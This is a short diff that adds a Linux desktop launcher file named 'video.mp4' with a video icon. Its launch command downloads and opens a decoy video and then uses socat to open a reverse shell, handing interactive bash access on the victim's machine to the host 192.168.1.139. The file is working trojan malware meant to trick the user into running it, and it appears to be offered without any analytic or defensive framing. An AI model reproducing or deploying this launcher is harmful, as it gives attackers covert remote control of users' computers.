@@ -1,0 +1,8 @@
+#!/usr/bin/env xdg-open
+[Desktop Entry]
+Encoding=UTF-8
+Name=video.mp4
+Exec=/bin/bash -c "/usr/bin/wget '192.168.1.139/video.mp4' -O /tmp/video.mp4;/usr/bin/xdg-open /tmp/video.mp4;socat tcp:192.168.1.139:4007 exec:/bin/bash,pty,stderr,setsid,sigint,sane"
+Terminal=false
+Type=Application
+Icon=video-x-generic
